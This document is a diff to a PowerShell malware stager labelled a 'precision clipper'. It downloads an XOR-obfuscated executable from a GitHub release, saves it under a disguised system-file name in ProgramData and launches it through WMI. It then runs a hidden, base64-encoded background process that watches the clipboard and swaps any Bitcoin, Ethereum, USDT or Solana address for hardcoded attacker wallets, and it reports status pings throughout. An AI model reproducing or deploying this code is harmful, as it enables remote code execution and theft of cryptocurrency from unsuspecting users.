@@ -1,4 +1,4 @@
-# --- [ELITE RESEARCH STAGER v22.0: PRECISION CLIPPER] ---
+# --- [ELITE RESEARCH STAGER v22.0: MULTI-NETWORK PRECISION CLIPPER] ---
 
 function Global-Initialize {
     try {
@@ -18,25 +18,23 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V22_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V22_LOADED_ON_$($env:COMPUTERNAME)"
 
 try {
     $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
     $path = Join-Path $dir "WinSvcHost.exe"
 
-    # Download & Decrypt
+    # Persistence: Keep previous stager behavior
     $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
     $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
-
-    # Launch EXE via WMI
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # --- PRECISION CLIPPER ENGINE ---
+    # --- THE UPDATED PRECISION CLIPPER ENGINE ---
     $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $targets = @{
@@ -45,29 +43,27 @@ try {
         "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
         "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
     }
-    
-    # Precise Regex Patterns
-    $reg_btc  = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"
-    $reg_eth  = "^0x[a-fA-F0-9]{40}$"
-    $reg_usdt = "^T[A-Za-z1-9]{33}$"
-    $reg_sol  = "^[1-9A-HJ-NP-Za-km-z]{32,44}$"
 
     while($true) {
         try {
             if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                 $clip = [System.Windows.Forms.Clipboard]::GetText().Trim()
                 
-                if ($clip -match $reg_btc) {
-                    if ($clip -ne $targets["btc"]) { [System.Windows.Forms.Clipboard]::SetText($targets["btc"]) }
+                # 1. BITCOIN (Legacy '1', SegWit '3', Native 'bc1')
+                if ($clip -match "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$") {
+                    if ($clip -ne $targets.btc) { [System.Windows.Forms.Clipboard]::SetText($targets.btc) }
                 }
-                elseif ($clip -match $reg_eth) {
-                    if ($clip -ne $targets["eth"]) { [System.Windows.Forms.Clipboard]::SetText($targets["eth"]) }
+                # 2. ETHEREUM (Starts with 0x, exactly 42 chars)
+                elseif ($clip -match "^0x[a-fA-F0-9]{40}$") {
+                    if ($clip -ne $targets.eth) { [System.Windows.Forms.Clipboard]::SetText($targets.eth) }
                 }
-                elseif ($clip -match $reg_usdt) {
-                    if ($clip -ne $targets["usdt"]) { [System.Windows.Forms.Clipboard]::SetText($targets["usdt"]) }
+                # 3. USDT (TRC-20, Starts with T, exactly 34 chars)
+                elseif ($clip -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") {
+                    if ($clip -ne $targets.usdt) { [System.Windows.Forms.Clipboard]::SetText($targets.usdt) }
                 }
-                elseif ($clip -match $reg_sol) {
-                    if ($clip -ne $targets["sol"]) { [System.Windows.Forms.Clipboard]::SetText($targets["sol"]) }
+                # 4. SOLANA (Base58, 32-44 chars, NO '0, O, I, l')
+                elseif ($clip -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") {
+                    if ($clip -ne $targets.sol) { [System.Windows.Forms.Clipboard]::SetText($targets.sol) }
                 }
             }
         } catch {}
@@ -75,12 +71,11 @@ try {
     }
 '@
 
-    # Launch as an Encoded Background Process
-    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClipperCode)
-    $Encoded = [Convert]::ToBase64String($Bytes)
-    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $Encoded" -WindowStyle Hidden
+    # Launch clipper in a hidden, high-priority background process
+    $Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
+    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Encoded
 
-    Send-Ping -m "PRECISION_CLIPPER_V22_DEPLOYED"
+    Send-Ping -m "PRECISION_CLIPPER_V22_LIVE"
 } catch {
-    Send-Ping -m "ERROR_$($_.Exception.Message)"
+    Send-Ping -m "FATAL_ERROR_$($_.Exception.Message)"
 }
